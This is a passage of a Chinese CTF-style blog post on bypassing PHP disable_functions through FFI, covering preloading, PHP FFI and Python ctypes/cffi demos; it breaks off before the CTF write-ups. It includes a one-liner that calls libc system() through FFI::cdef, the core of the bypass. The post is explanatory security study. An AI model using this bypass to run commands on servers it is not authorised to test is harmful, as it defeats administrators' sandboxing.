<!doctype html><html lang=en-us><head><meta charset=utf-8><meta http-equiv=x-ua-compatible content="IE=edge,chrome=1"><title>AmiaaaZ's Site | FFI绕过disable_functions</title><meta name=viewport content="width=device-width,minimum-scale=1"><meta name=generator content="Hugo 0.108.0"><meta name=ROBOTS content="INDEX, FOLLOW"><link href=/dist/app.css rel=stylesheet><script type=application/javascript>var doNotTrack=!1;doNotTrack||(window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)},ga.l=+new Date,ga("create","UA-203328343-1","auto"),ga("send","pageview"))</script><script async src=https://www.google-analytics.com/analytics.js></script>
<link rel=stylesheet href=https://amiaaaz.github.io/lib/katex.min.css integrity=sha384-zB1R0rpPzHqg7Kpt0Aljp8JPLqbXI3bhnPWROx27a9N0Ll6ZP/+DiW/UqRcLbRjq crossorigin=anonymous><script defer src=https://amiaaaz.github.io/lib/katex.min.js integrity=sha384-y23I5Q6l+B6vatafAwxRu/0oK/79VlbSz7Q9aiSZUvyWYIYsd+qj+o24G5ZU2zJz crossorigin=anonymous></script>
<script defer src=https://amiaaaz.github.io/lib/contrib/auto-render.min.js integrity=sha384-kWPLUVMOks5AQFrykwIup5lo0m3iMkkHrD0uJ4H5cjeGihAutqP0yW0J6dpFiVkI crossorigin=anonymous onload=renderMathInElement(document.body)></script>
<script>document.addEventListener("DOMContentLoaded",function(){renderMathInElement(document.body,{delimiters:[{left:"$$",right:"$$",display:!0},{left:"$",right:"$",display:!1}]})})</script><script>(function(e,t){var s=document,o="script",n=s.createElement(o),i=s.getElementsByTagName(o)[0];n.src=e,t&&n.addEventListener("load",function(e){t(e)}),i.parentNode.insertBefore(n,i)})("https://amiaaaz.github.io/lib/pangu.min.js",function(){pangu.spacingPage()})</script><style type=text/css media="screen, print">@font-face{font-family:fancytitlefont;font-style:normal;font-display:swap;src:url(%25!s%28%3cnil%3e%29.woff2)format('woff2'),url(%25!s%28%3cnil%3e%29.woff)format('woff')}@font-face{font-family:noto serif cjk sc;font-style:normal;font-weight:300;font-display:swap;src:local('Noto Serif CJK SC Light'),local('NotoSerifCJK-Light'),url(https://amiaaaz.github.io/fonts/noto-serif-sc-v7-latin_chinese-simplified-300.woff2)format('woff2'),url(https://amiaaaz.github.io/fonts/noto-serif-sc-v7-latin_chinese-simplified-300.woff)format('woff')}@font-face{font-family:noto serif cjk sc;font-style:normal;font-weight:400;font-display:swap;src:local('Noto Serif CJK SC'),local('NotoSerifCJK-Regular'),url(https://amiaaaz.github.io/fonts/noto-serif-sc-v7-latin_chinese-simplified-regular.woff2)format('woff2'),url(https://amiaaaz.github.io/fonts/noto-serif-sc-v7-latin_chinese-simplified-regular.woff)format('woff')}@font-face{font-family:noto serif cjk sc;font-style:normal;font-weight:500;font-display:swap;src:local('Noto Serif CJK SC Medium'),local('NotoSerifCJK-Medium'),url(https://amiaaaz.github.io/fonts/noto-serif-sc-v7-latin_chinese-simplified-500.woff2)format('woff2'),url(https://amiaaaz.github.io/fonts/noto-serif-sc-v7-latin_chinese-simplified-500.woff)format('woff')}</style></head><body class="bg-gray-100 text-gray-700 font-sans"><div class="p-6 sm:p-10 md:p-16 flex flex-wrap"><header class="w-full md:w-2/5 xl:w-1/2 md:pr-12 lg:pr-20 xl:pr-24 order-1 md:order-1 max-w-2xl"><div class="z-50 bg-gray-100 bg-opacity-75 bg-opacity-custom lg:min-w-0.7 max-w-xl md:float-right md:text-right leading-loose tracking-tight md:sticky md:top-0 pt-2"><div><h2><a href=https://amiaaaz.github.io/ title="AmiaaaZ's Site" class="heading font-cursive icon">AmiaaaZ's Site</a></h2></div><h1 class=pt-2>FFI绕过disable_functions</h1><h3 class="text-java-700 font-normal leading-relaxed pt-2">三个主人公: Preloading&FFI&Serializable</h3><div class="flex flex-wrap justify-end pt-2"><div class="md:flex-grow-0 font-light"><a class="post-taxonomy-category text-medium-red-violet-600 hover:text-medium-red-violet-400" href=/categories/notessummary>NOTES&SUMMARY</a>
&nbsp;&nbsp;
<a class="post-taxonomy-tag text-eucalyptus-500" href=/tags/php>PHP</a>&nbsp;/
<a class="post-taxonomy-tag text-eucalyptus-500" href=/tags/unserialize>unserialize</a>&nbsp;/
<a class="post-taxonomy-tag text-eucalyptus-500" href=/tags/ffi>FFI</a>&nbsp;/
<a class="post-taxonomy-tag text-eucalyptus-500" href=/tags/bypass_disable_functions>bypass_disable_functions</a></div><time class="text-eucalyptus-500 md:text-right md:flex-grow font-light pl-4" datetime=2021-12-03T00:01:07+08:00>2021-12-3 00:01</time></div><details class=toc open><summary><hr></summary><div class="inline toc-content"><nav id=TableOfContents><ul><li><a href=#preloading>Preloading</a></li><li><a href=#ffi>FFI</a><ul><li><a href=#跑个题ffi-in-python>跑个题：FFI in Python</a></li></ul></li><li><a href=#serializable>Serializable</a></li><li><a href=#rctf-2019nextphp>[RCTF 2019]Nextphp</a><ul><li><a href=#极客大挑战-2020roamphp5-fighterfightsinvincibly>[极客大挑战 2020]Roamphp5-FighterFightsInvincibly</a></li></ul></li></ul></nav></div></details><hr></div></header><main role=main class="w-full md:w-3/5 xl:w-1/2 max-w-3xl order-2 md:order-2 min-h-70vh pt-2 pb-4"><article><section class="mx-auto content"><div class=c-rich-text><p>废话不多说，直接进入正题；文中参考链接统一扔后面了</p><h2 id=preloading>Preloading</h2><ul><li><a href=https://wiki.php.net/rfc/preload>PHP RFC: Preloading</a> | php7.4启用</li></ul><p>预加载文件到opcache中，类不能有不可达的父类、接口，also only top-level entities are not nested with control structures (e.g. if()&mldr;)may be preloaded；被加载后除非重启，进行的修改不影响当前进程；预加载不影响静态类成员和变量的表现；Windows中不能预加载从内部继承的类（Windows ASLR and absence of fork() don&rsquo;t allow to guarantee the same addresses of internal classes in different processes.）；多版本有可能造成bug</p><p><img src=https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211202161008294.png alt=image-20211202161008294></p><h2 id=ffi>FFI</h2><ul><li><a href=https://wiki.php.net/rfc/ffi>PHP RFC: FFI - Foreign Function Interface</a> | php7.4启用</li></ul><p>文档中给了一个小栗子</p><div class=highlight><pre tabindex=0 style=color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=display:flex><span><span style=color:#f92672>&lt;?</span><span style=color:#75af00>php</span>
</span></span><span style=display:flex><span><span style=color:#75715e>// create FFI object, loading libc and exporting function printf()
</span></span></span><span style=display:flex><span><span style=color:#75715e></span><span style=color:#111>$ffi</span> <span style=color:#f92672>=</span> <span style=color:#75af00>FFI</span><span style=color:#f92672>::</span><span style=color:#75af00>cdef</span><span style=color:#111>(</span>
</span></span><span style=display:flex><span>    <span style=color:#d88200>&#34;int printf(const char *format, ...);&#34;</span><span style=color:#111>,</span> <span style=color:#75715e>// this is regular C declaration
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>    <span style=color:#d88200>&#34;libc.so.6&#34;</span><span style=color:#111>);</span>
</span></span><span style=display:flex><span><span style=color:#75715e>// call C printf()
</span></span></span><span style=display:flex><span><span style=color:#75715e></span><span style=color:#111>$ffi</span><span style=color:#f92672>-&gt;</span><span style=color:#75af00>printf</span><span style=color:#111>(</span><span style=color:#d88200>&#34;Hello %s!</span><span style=color:#8045ff>\n</span><span style=color:#d88200>&#34;</span><span style=color:#111>,</span> <span style=color:#d88200>&#34;world&#34;</span><span style=color:#111>);</span>
</span></span></code></pre></div><p>直接运行即可输出Hello world!；这个函数的原型是这样的</p><div class=highlight><pre tabindex=0 style=color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=display:flex><span><span style=color:#75af00>FFI</span><span style=color:#f92672>::</span><span style=color:#75af00>cdef</span><span style=color:#111>([</span><span style=color:#75af00>string</span> <span style=color:#111>$cdef</span> <span style=color:#f92672>=</span> <span style=color:#d88200>&#34;&#34;</span> <span style=color:#111>[,</span> <span style=color:#75af00>string</span> <span style=color:#111>$lib</span> <span style=color:#f92672>=</span> <span style=color:#00a8c8>null</span><span style=color:#111>]])</span><span style=color:#f92672>:</span> <span style=color:#75af00>FFI</span>
</span></span></code></pre></div><p>书写的形式相当的简洁，创建FFI对象（声明）->调用c方法；试着直接执行一个whoami</p><div class=highlight><pre tabindex=0 style=color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>php -r <span style=color:#d88200>&#39;$ffi = FFI::cdef(&#34;int system(char *command);&#34;);$ffi-&gt;system(&#34;whoami&#34;);&#39;</span>
</span></span></code></pre></div><p>发现在没有第二个参数的情况下也可以正常执行system函数，看下<a href=https://github.dev/php/php-src/blob/d29e93870ab2141e8a38cccefb81553f0b16cbfe/ext/ffi/ffi.c#L2853-L2879>源码</a></p><p><img src=https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211202231908072.png alt=image-20211202231908072></p><p>这种情况下lib=NULL，handle=RTLD_DEFAULT（这个注释TODO就很灵性）</p><p><img src=https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211202232422896.png alt=image-20211202232422896></p><p>随后调用<code>DL_FETCH_SYMBOL</code>，<a href=https://github.dev/php/php-src/blob/d29e93870ab2141e8a38cccefb81553f0b16cbfe/Zend/zend_portability.h#L166-L168>也就是</a>dlsysm</p><p><img src=https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211202232601190.png alt=image-20211202232601190></p><blockquote><p><strong>RTLD_DEFAULT</strong></p><p>Find the first occurrence of the desired symbol using the default shared object search order. The search will include global symbols in the executable and its dependencies, as well as symbols in shared objects that were dynamically loaded with the <strong>RTLD_GLOBAL</strong>flag.</p></blockquote><p>当dlsym第一个参数为RTLD_DEFAULT时，会按照默认共享库顺序查找system的位置，搜索范围还包括了可执行程序极其依赖中的函数表（如果设置了 RTLD_GLOBAL还会搜索动态加载库中的函数表），也就是直接在全局符号表里找了，所以不需要指定加载库，fopen这类函数也是一样</p><p>更多的栗子请参见<a href=https://wiki.php.net/rfc/ffi>文档</a>和<a href=https://www.laruence.com/2020/03/11/5475.html>这一篇文章</a>，写的都很详细</p><h3 id=跑个题ffi-in-python>跑个题：FFI in Python</h3><p>Python的优点就不必说了，缺点是封装太好了导致运行速度上不去，那为什么不直接在Python中用C/C++呢？</p><p>肥肠不错的想法！不过要解决的有两个问题：Marshalling（感觉编组这个翻译很奇怪 但是这个行为可以类比一下serialize） & Manageing Memory（内存管理）</p><ul><li>Python中万物皆object，而C中有严格的int float等等类型</li><li>Python有gc，而C中需要手动malloc</li></ul><p>不过不急，已经有库封装好了这些功能可以直接使用，来康康demo</p><h4 id=ctypes库>ctypes库</h4><div class=highlight><pre tabindex=0 style=color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=display:flex><span><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;stdio.h&gt;</span><span style=color:#75715e>
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>
</span></span><span style=display:flex><span><span style=color:#00a8c8>float</span> <span style=color:#75af00>cadd</span><span style=color:#111>(</span><span style=color:#00a8c8>int</span> <span style=color:#111>x</span><span style=color:#111>,</span> <span style=color:#00a8c8>float</span> <span style=color:#111>y</span><span style=color:#111>)</span> <span style=color:#111>{</span>
</span></span><span style=display:flex><span>    <span style=color:#00a8c8>float</span> <span style=color:#111>res</span> <span style=color:#f92672>=</span> <span style=color:#111>x</span> <span style=color:#f92672>+</span> <span style=color:#111>y</span><span style=color:#111>;</span>
</span></span><span style=display:flex><span>    <span style=color:#75af00>printf</span><span style=color:#111>(</span><span style=color:#d88200>&#34;In cadd: int %d float %.1f returning  %.1f</span><span style=color:#8045ff>\n</span><span style=color:#d88200>&#34;</span><span style=color:#111>,</span> <span style=color:#111>x</span><span style=color:#111>,</span> <span style=color:#111>y</span><span style=color:#111>,</span> <span style=color:#111>res</span><span style=color:#111>);</span>
</span></span><span style=display:flex><span>    <span style=color:#00a8c8>return</span> <span style=color:#111>res</span><span style=color:#111>;</span>
</span></span><span style=display:flex><span><span style=color:#111>}</span>
</span></span></code></pre></div><div class=highlight><pre tabindex=0 style=color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#f92672>import</span> <span style=color:#111>ctypes</span>
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> <span style=color:#111>pathlib</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#00a8c8>if</span> <span style=color:#111>__name__</span> <span style=color:#f92672>==</span> <span style=color:#d88200>&#34;__main__&#34;</span><span style=color:#111>:</span>
</span></span><span style=display:flex><span>    <span style=color:#75715e># load the lib</span>
</span></span><span style=display:flex><span>    <span style=color:#111>libname</span> <span style=color:#f92672>=</span> <span style=color:#111>pathlib</span><span style=color:#f92672>.</span><span style=color:#111>Path</span><span style=color:#111>()</span><span style=color:#f92672>.</span><span style=color:#111>absolute</span><span style=color:#111>()</span> <span style=color:#f92672>/</span> <span style=color:#d88200>&#34;libcadd.so&#34;</span>
</span></span><span style=display:flex><span>    <span style=color:#111>c_lib</span> <span style=color:#f92672>=</span> <span style=color:#111>ctypes</span><span style=color:#f92672>.</span><span style=color:#111>CDLL</span><span style=color:#111>(</span><span style=color:#111>libname</span><span style=color:#111>)</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#111>x</span><span style=color:#111>,</span> <span style=color:#111>y</span> <span style=color:#f92672>=</span> <span style=color:#ae81ff>6</span><span style=color:#111>,</span> <span style=color:#ae81ff>2.3</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#75715e># define the return type</span>
</span></span><span style=display:flex><span>    <span style=color:#111>c_lib</span><span style=color:#f92672>.</span><span style=color:#111>cadd</span><span style=color:#f92672>.</span><span style=color:#111>restype</span> <span style=color:#f92672>=</span> <span style=color:#111>ctypes</span><span style=color:#f92672>.</span><span style=color:#111>c_float</span>
</span></span><span style=display:flex><span>    <span style=color:#75715e># call the function with the correct argument types</span>
</span></span><span style=display:flex><span>    <span style=color:#111>res</span> <span style=color:#f92672>=</span> <span style=color:#111>c_lib</span><span style=color:#f92672>.</span><span style=color:#111>cadd</span><span style=color:#111>(</span><span style=color:#111>x</span><span style=color:#111>,</span> <span style=color:#111>ctypes</span><span style=color:#f92672>.</span><span style=color:#111>c_float</span><span style=color:#111>(</span><span style=color:#111>y</span><span style=color:#111>))</span>
</span></span><span style=display:flex><span>    <span style=color:#111>print</span><span style=color:#111>(</span><span style=color:#d88200>f</span><span style=color:#d88200>&#34;In python: int: </span><span style=color:#d88200>{</span><span style=color:#111>x</span><span style=color:#d88200>}</span><span style=color:#d88200> float </span><span style=color:#d88200>{</span><span style=color:#111>y</span><span style=color:#d88200>:</span><span style=color:#d88200>.1f</span><span style=color:#d88200>}</span><span style=color:#d88200> return val </span><span style=color:#d88200>{</span><span style=color:#111>res</span><span style=color:#d88200>:</span><span style=color:#d88200>.1f</span><span style=color:#d88200>}</span><span style=color:#d88200>&#34;</span><span style=color:#111>)</span>
</span></span></code></pre></div><div class=highlight><pre tabindex=0 style=color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>$ gcc -shared -Wl,-soname,libcadd -o libcadd.so -fPIC cadd.c
</span></span><span style=display:flex><span>$ python3 test.py
</span></span><span style=display:flex><span>In cadd: int <span style=color:#ae81ff>6</span> float 2.3 returning  8.3
</span></span><span style=display:flex><span>In python: int: <span style=color:#ae81ff>6</span> float 2.3 <span style=color:#00a8c8>return</span> val 8.3
</span></span></code></pre></div><p><img src=https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211202173119818.png alt=image-20211202173119818></p><p>可以看到成功调用了cadd.so，而我们在python中要做的只有加载.so->设置符合C标准的返回值类型->调用，肥肠的简单</p><p>不过标准库ctypes有一些缺陷 并且不能拓展大型项目，鉴于此我们可以使用cffi库</p><h4 id=cffi库>cffi库</h4><p>这里是一个hello world的小demo</p><div class=highlight><pre tabindex=0 style=color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#f92672>from</span> <span style=color:#111>cffi</span> <span style=color:#f92672>import</span> <span style=color:#111>FFI</span>
</span></span><span style=display:flex><span><span style=color:#111>ffi</span> <span style=color:#f92672>=</span> <span style=color:#111>FFI</span><span style=color:#111>()</span>
</span></span><span style=display:flex><span><span style=color:#75715e># 可以定义函数 结构体 变量</span>
</span></span><span style=display:flex><span><span style=color:#111>ffi</span><span style=color:#f92672>.</span><span style=color:#111>cdef</span><span style=color:#111>(</span><span style=color:#d88200>&#34;&#34;&#34;
</span></span></span><span style=display:flex><span><span style=color:#d88200>         int printf(const char *format, ...);
</span></span></span><span style=display:flex><span><span style=color:#d88200>&#34;&#34;&#34;</span><span style=color:#111>)</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#111>c</span> <span style=color:#f92672>=</span> <span style=color:#111>ffi</span><span style=color:#f92672>.</span><span style=color:#111>dlopen</span><span style=color:#111>(</span><span style=color:#00a8c8>None</span><span style=color:#111>)</span>    <span style=color:#75715e># 加载c命名空间</span>
</span></span><span style=display:flex><span><span style=color:#111>arg</span> <span style=color:#f92672>=</span> <span style=color:#111>ffi</span><span style=color:#f92672>.</span><span style=color:#111>new</span><span style=color:#111>(</span><span style=color:#d88200>&#34;char[]&#34;</span><span style=color:#111>,</span> <span style=color:#d88200>b</span><span style=color:#d88200>&#34;world&#34;</span><span style=color:#111>)</span>   <span style=color:#75715e># 即 char arg[]=&#34;world&#34;;</span>
</span></span><span style=display:flex><span><span style=color:#111>c</span><span style=color:#f92672>.</span><span style=color:#111>printf</span><span style=color:#111>(</span><span style=color:#d88200>b</span><span style=color:#d88200>&#34;hello </span><span style=color:#d88200>%s</span><span style=color:#8045ff>\n</span><span style=color:#d88200>&#34;</span><span style=color:#111>,</span> <span style=color:#111>arg</span><span style=color:#111>)</span>
</span></span></code></pre></div><p>这个栗子里直接在一个py文件中用cffi调用库函数就结束了，肥肠肥肠的简单；或者也可以和ctypes一样，单独写一个c先</p><div class=highlight><pre tabindex=0 style=color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=display:flex><span><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;stdio.h&gt;</span><span style=color:#75715e>
</span></span></span><span style=display:flex><span><span style=color:#75715e></span><span style=color:#00a8c8>int</span> <span style=color:#75af00>Tadd</span><span style=color:#111>(</span><span style=color:#00a8c8>int</span> <span style=color:#111>a</span><span style=color:#111>,</span> <span style=color:#00a8c8>int</span> <span style=color:#111>b</span><span style=color:#111>){</span>
</span></span><span style=display:flex><span>    <span style=color:#00a8c8>int</span> <span style=color:#111>c</span><span style=color:#111>;</span>
</span></span><span style=display:flex><span>    <span style=color:#111>c</span> <span style=color:#f92672>=</span> <span style=color:#111>a</span><span style=color:#f92672>+</span><span style=color:#111>b</span><span style=color:#111>;</span>
</span></span><span style=display:flex><span>    <span style=color:#00a8c8>return</span> <span style=color:#111>c</span><span style=color:#111>;</span>
</span></span><span style=display:flex><span><span style=color:#111>}</span>
</span></span><span style=display:flex><span><span style=color:#00a8c8>void</span> <span style=color:#75af00>Tprint</span><span style=color:#111>(</span><span style=color:#00a8c8>void</span><span style=color:#111>){</span>
</span></span><span style=display:flex><span>    <span style=color:#75af00>printf</span><span style=color:#111>(</span><span style=color:#d88200>&#34;hello, world</span><span style=color:#8045ff>\n</span><span style=color:#d88200>&#34;</span><span style=color:#111>);</span>
</span></span><span style=display:flex><span><span style=color:#111>}</span>
</span></span><span style=display:flex><span><span style=color:#00a8c8>int</span> <span style=color:#75af00>Tmul</span><span style=color:#111>(</span><span style=color:#00a8c8>int</span> <span style=color:#111>a</span><span style=color:#111>,</span> <span style=color:#00a8c8>int</span> <span style=color:#111>b</span><span style=color:#111>){</span>
</span></span><span style=display:flex><span>    <span style=color:#00a8c8>return</span> <span style=color:#111>a</span><span style=color:#f92672>*</span><span style=color:#111>b</span><span style=color:#111>;</span>
</span></span><span style=display:flex><span><span style=color:#111>}</span>
</span></span></code></pre></div><p>然后调用<code>ffi.verify()</code>在Python中加载和使用，不过还需要额外声明函数</p><div class=highlight><pre tabindex=0 style=color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#f92672>from</span> <span style=color:#111>cffi</span> <span style=color:#f92672>import</span> <span style=color:#111>FFI</span>
</span></span><span style=display:flex><span><span style=color:#111>ffi</span> <span style=color:#f92672>=</span> <span style=color:#111>FFI</span><span style=color:#111>()</span>
</span></span><span style=display:flex><span><span style=color:#111>ffi</span><span style=color:#f92672>.</span><span style=color:#111>cdef</span><span style=color:#111>(</span><span style=color:#d88200>&#34;&#34;&#34;
</span></span></span><span style=display:flex><span><span style=color:#d88200>    int Tadd(int a, int b);
</span></span></span><span style=display:flex><span><span style=color:#d88200>    void Tprint(void);
</span></span></span><span style=display:flex><span><span style=color:#d88200>    int Tmul(int a, int b);
</span></span></span><span style=display:flex><span><span style=color:#d88200>&#34;&#34;&#34;</span><span style=color:#111>)</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#111>lib</span> <span style=color:#f92672>=</span> <span style=color:#111>ffi</span><span style=color:#f92672>.</span><span style=color:#111>verify</span><span style=color:#111>(</span><span style=color:#111>sources</span><span style=color:#f92672>=</span><span style=color:#111>[</span><span style=color:#d88200>&#39;uu.c&#39;</span><span style=color:#111>])</span>
</span></span><span style=display:flex><span><span style=color:#111>print</span><span style=color:#111>(</span><span style=color:#111>lib</span><span style=color:#f92672>.</span><span style=color:#111>Tadd</span><span style=color:#111>(</span><span style=color:#ae81ff>10</span><span style=color:#111>,</span> <span style=color:#ae81ff>2</span><span style=color:#111>))</span>
</span></span><span style=display:flex><span><span style=color:#111>lib</span><span style=color:#f92672>.</span><span style=color:#111>Tprint</span><span style=color:#111>()</span>
</span></span><span style=display:flex><span><span style=color:#111>print</span><span style=color:#111>(</span><span style=color:#111>lib</span><span style=color:#f92672>.</span><span style=color:#111>Tmul</span><span style=color:#111>(</span><span style=color:#ae81ff>3</span><span style=color:#111>,</span> <span style=color:#ae81ff>5</span><span style=color:#111>))</span>
</span></span></code></pre></div><p><img src=https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211202180822923.png alt=image-20211202180822923></p><p>以上方式都是在线api模式，cffi还支持离线api模式，比如下面这个demo</p><div class=highlight><pre tabindex=0 style=color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#f92672>from</span> <span style=color:#111>cffi</span> <span style=color:#f92672>import</span> <span style=color:#111>FFI</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#111>ffibuilder</span> <span style=color:#f92672>=</span> <span style=color:#111>FFI</span><span style=color:#111>()</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#111>ffibuilder</span><span style=color:#f92672>.</span><span style=color:#111>cdef</span><span style=color:#111>(</span><span style=color:#d88200>&#34;&#34;&#34;
</span></span></span><span style=display:flex><span><span style=color:#d88200>    double sqrt(double x);
</span></span></span><span style=display:flex><span><span style=color:#d88200>&#34;&#34;&#34;</span><span style=color:#111>)</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># 需要的头文件</span>
</span></span><span style=display:flex><span><span style=color:#111>ffibuilder</span><span style=color:#f92672>.</span><span style=color:#111>set_source</span><span style=color:#111>(</span><span style=color:#d88200>&#34;_libmath&#34;</span><span style=color:#111>,</span>
</span></span><span style=display:flex><span>    <span style=color:#d88200>&#34;&#34;&#34;
</span></span></span><span style=display:flex><span><span style=color:#d88200>    #include &lt;math.h&gt;
</span></span></span><span style=display:flex><span><span style=color:#d88200>    &#34;&#34;&#34;</span><span style=color:#111>,</span>
</span></span><span style=display:flex><span>    <span style=color:#111>library_dirs</span> <span style=color:#f92672>=</span> <span style=color:#111>[],</span>
</span></span><span style=display:flex><span>    <span style=color:#111>libraries</span> <span style=color:#f92672>=</span> <span style=color:#111>[</span><span style=color:#d88200>&#39;m&#39;</span><span style=color:#111>]</span>
</span></span><span style=display:flex><span><span style=color:#111>)</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#111>ffibuilder</span><span style=color:#f92672>.</span><span style=color:#111>compile</span><span style=color:#111>(</span><span style=color:#111>verbose</span><span style=color:#f92672>=</span><span style=color:#00a8c8>True</span><span style=color:#111>)</span>
</span></span></code></pre></div><div class=highlight><pre tabindex=0 style=color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>python build_cffi.py
</span></span></code></pre></div><div class=highlight><pre tabindex=0 style=color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#f92672>from</span> <span style=color:#111>_libmath</span> <span style=color:#f92672>import</span> <span style=color:#111>lib</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># 直接调用c函数</span>
</span></span><span style=display:flex><span><span style=color:#111>x</span> <span style=color:#f92672>=</span> <span style=color:#111>lib</span><span style=color:#f92672>.</span><span style=color:#111>sqrt</span><span style=color:#111>(</span><span style=color:#ae81ff>4.5</span><span style=color:#111>)</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#111>print</span><span style=color:#111>(</span><span style=color:#d88200>F</span><span style=color:#d88200>&#34;The square root of 4.5 is </span><span style=color:#d88200>{</span><span style=color:#111>x</span><span style=color:#d88200>}</span><span style=color:#d88200>.&#34;</span><span style=color:#111>)</span>
</span></span></code></pre></div><div class=highlight><pre tabindex=0 style=color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>python test.py
</span></span></code></pre></div><p><img src=https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211202173047579.png alt=image-20211202173047579></p><p>可以看到这里先用一个py文件调用.h来编译生成.so和.c，然后在另一个py文件中调用.c即可</p><p>或者还有第三种方式，在Python中使用外部已经定义好的c库函数；这里使用<a href=https://github.com/wolever>wolever</a>/<a href=https://github.com/wolever/python-cffi-example>python-cffi-example</a>来演示（<del>就不复制粘贴了捏</del> 就粘就粘</p><p>首先是一个<a href=https://github.dev/wolever/python-cffi-example/blob/ec14da61ee0de770750ff3781b412a3b25f020eb/cffi_example/fnmatch.h#L1-L18>fnmatch.h</a></p><p><img src=https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211202184827657.png alt=image-20211202184827657></p><p>注意7 8 9行要改一下的，根据/usr/include/fnmatch.h改</p><p><img src=https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211202185217525.png alt=image-20211202185217525></p><p>这是<a href=https://github.dev/wolever/python-cffi-example/blob/ec14da61ee0de770750ff3781b412a3b25f020eb/cffi_example/build_fnmatch.py#L1>build_fnmatch.py</a>，用于生成模块在fnmatch.py中使用</p><div class=highlight><pre tabindex=0 style=color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#f92672>import</span> <span style=color:#111>os</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#f92672>from</span> <span style=color:#111>cffi</span> <span style=color:#f92672>import</span> <span style=color:#111>FFI</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#111>ffi</span> <span style=color:#f92672>=</span> <span style=color:#111>FFI</span><span style=color:#111>()</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#111>ffi</span><span style=color:#f92672>.</span><span style=color:#111>set_source</span><span style=color:#111>(</span><span style=color:#d88200>&#34;cffi_example._fnmatch&#34;</span><span style=color:#111>,</span>
</span></span><span style=display:flex><span>    <span style=color:#75715e># Since we are calling fnmatch directly no custom source is necessary. We</span>
</span></span><span style=display:flex><span>    <span style=color:#75715e># need to #include &lt;fnmatch.h&gt;, though, because behind the scenes cffi</span>
</span></span><span style=display:flex><span>    <span style=color:#75715e># generates a .c file which contains a Python-friendly wrapper around</span>
</span></span><span style=display:flex><span>    <span style=color:#75715e># ``fnmatch``:</span>
</span></span><span style=display:flex><span>    <span style=color:#75715e>#    static PyObject *</span>
</span></span><span style=display:flex><span>    <span style=color:#75715e>#    _cffi_f_fnmatch(PyObject *self, PyObject *args) {</span>
</span></span><span style=display:flex><span>    <span style=color:#75715e>#        ... setup ...</span>
</span></span><span style=display:flex><span>    <span style=color:#75715e>#        result = fnmatch(...);</span>
</span></span><span style=display:flex><span>    <span style=color:#75715e>#        return PyInt_FromLong(result);</span>
</span></span><span style=display:flex><span>    <span style=color:#75715e>#    }</span>
</span></span><span style=display:flex><span>    <span style=color:#d88200>&#34;#include &lt;fnmatch.h&gt;&#34;</span><span style=color:#111>,</span>
</span></span><span style=display:flex><span>    <span style=color:#75715e># The important thing is to inclue libc in the list of libraries we&#39;re</span>
</span></span><span style=display:flex><span>    <span style=color:#75715e># linking against:</span>
